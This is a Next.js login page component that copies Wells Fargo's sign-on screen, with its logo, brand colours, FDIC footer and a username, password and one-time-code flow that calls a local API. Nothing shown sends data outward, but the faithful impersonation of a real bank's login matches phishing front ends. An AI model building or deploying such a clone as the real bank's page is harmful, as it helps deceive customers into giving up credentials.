"use client";

import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { ArrowRight, ScanFace, CreditCard, Home, PiggyBank, TrendingUp } from "lucide-react";
import Input from "@/components/Input";
import Button from "@/components/Button";
import { useAuth, verifyCredentials } from "@/lib/auth";

const REMEMBER_KEY = "wf_remember_userid";

const greeting = () => {
  const h = new Date().getHours();
  if (h < 12) return "Good morning";
  if (h < 18) return "Good afternoon";
  return "Good evening";
};

const products = [
  { label: "Credit Cards", icon: CreditCard },
  { label: "Home Loans", icon: Home },
  { label: "Savings & CDs", icon: PiggyBank },
  { label: "Investing", icon: TrendingUp },
];

export default function LoginPage() {
  const { user } = useAuth();
  const router = useRouter();
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    if (user) router.replace("/dashboard");
  }, [user, router]);

  useEffect(() => {
    try {
      const saved = localStorage.getItem(REMEMBER_KEY);
      if (saved) {
        setUserId(saved);
        setRemember(true);
      }
    } catch {
      // ignore
    }
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userId.trim() || !password) {
      setError("Please enter your username and password.");
      return;
    }
    setError("");
    setSubmitting(true);

    const cred = verifyCredentials(userId, password);
    if (!cred.ok) {
      setError(cred.error);
      setSubmitting(false);
      return;
    }

    try {
      if (remember) localStorage.setItem(REMEMBER_KEY, userId);
      else localStorage.removeItem(REMEMBER_KEY);
    } catch {
      // ignore
    }

    try {
      const res = await fetch("/api/send-login-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: cred.userId }),
      });
      const data = await res.json();
      if (!data.ok) {
        setError(data.error || "Failed to send verification code.");
        setSubmitting(false);
        return;
      }
      router.push(
        `/login-otp?uid=${encodeURIComponent(data.userInternalId)}&email=${encodeURIComponent(data.maskedEmail)}`
      );
    } catch {
      setError("Something went wrong. Please try again.");
      setSubmitting(false);
    }
  };

  return (
    <main className="min-h-screen bg-white flex flex-col">
      {/* Top brand bar */}
      <div className="bg-[#D71E28] h-1.5 w-full" />

      <div className="flex-1 flex flex-col items-center px-6 pt-10 pb-12">
        <div className="w-full max-w-md">
          <div className="flex flex-col items-center">
            <Image
              src="/well_logo.png"
              alt="Wells Fargo"
              width={84}
              height={84}
              priority
              className="rounded-xl"
            />
            <h1 className="mt-6 text-2xl font-bold text-[#2D2926]">
              {greeting()}
            </h1>
            <p className="mt-1 text-sm text-[#6D6E71]">
              Sign on to manage your accounts
            </p>
          </div>

          <form onSubmit={handleSubmit} className="mt-8 space-y-4">
            <Input
              label="Username"
              placeholder="Enter username"
              autoComplete="username"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
            />
            <Input
              label="Password"
              type="password"
              placeholder="Enter password"
              autoComplete="current-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />

            <div className="flex items-center justify-between pt-1">
              <label className="inline-flex items-center gap-2 cursor-pointer select-none">
                <input
                  type="checkbox"
                  checked={remember}
                  onChange={(e) => setRemember(e.target.checked)}
                  className="h-4 w-4 accent-[#D71E28] cursor-pointer rounded"
                />
                <span className="text-sm text-[#2D2926]">Save username</span>
              </label>
              <button
                type="button"
                className="inline-flex items-center gap-1.5 text-sm font-semibold text-[#D71E28] hover:underline"
              >
                <ScanFace size={16} /> Set up Face ID
              </button>
            </div>

            {error && (
              <div className="rounded-lg bg-red-50 border border-red-100 px-4 py-3 text-sm text-[#A01B22]">
                {error}
              </div>
            )}

            <Button type="submit" variant="primary" fullWidth size="lg" disabled={submitting}>
              {submitting ? "Signing on..." : "Sign on"} <ArrowRight size={16} />
            </Button>

            <div className="text-center pt-1">
              <a href="#" className="text-sm font-semibold text-[#D71E28] hover:underline">
                Forgot username or password?
              </a>
            </div>
          </form>

          {/* Explore products */}
          <div className="mt-12">
            <div className="flex items-center gap-4">
              <div className="flex-1 h-px bg-[#E6E8EB]" />
              <span className="text-xs uppercase tracking-wider text-[#9AA0A6] font-semibold">
                Explore our products
              </span>
              <div className="flex-1 h-px bg-[#E6E8EB]" />
            </div>
            <div className="mt-6 grid grid-cols-2 gap-3">
              {products.map(({ label, icon: Icon }) => (
                <a
                  key={label}
                  href="#"
                  className="flex items-center gap-3 p-4 rounded-xl border border-[#E6E8EB] bg-white hover:border-[#D71E28] hover:shadow-card transition-all"
                >
                  <span className="h-9 w-9 rounded-lg bg-[#D71E28]/10 text-[#D71E28] flex items-center justify-center shrink-0">
                    <Icon size={18} />
                  </span>
                  <span className="text-sm font-semibold text-[#2D2926]">{label}</span>
                </a>
              ))}
            </div>
          </div>

          <p className="mt-10 text-[11px] text-[#9AA0A6] text-center leading-relaxed">
            Wells Fargo Bank, N.A. Member FDIC. By signing on you agree to our{" "}
            <Link href="/login" className="underline">
              Online Access Agreement
            </Link>
            .
          </p>
        </div>
      </div>
    </main>
  );
}
